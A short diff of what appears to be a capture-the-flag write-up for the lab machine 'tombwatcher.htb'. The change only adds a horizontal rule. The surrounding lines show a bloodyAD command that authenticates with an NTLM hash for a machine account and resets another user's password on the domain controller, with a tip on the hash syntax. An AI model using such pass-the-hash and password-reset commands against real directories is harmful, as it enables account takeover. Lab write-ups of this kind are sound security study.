@@ -18,3 +18,5 @@ using hash:
 bloodyAD -u "ansible_dev$" -p :4b21348ca4a9edff9689cdf75cbda439 -d tombwatcher.htb --dc-ip 10.10.11.72 set password sam face
 ```
 just -p: before the password
+
+---
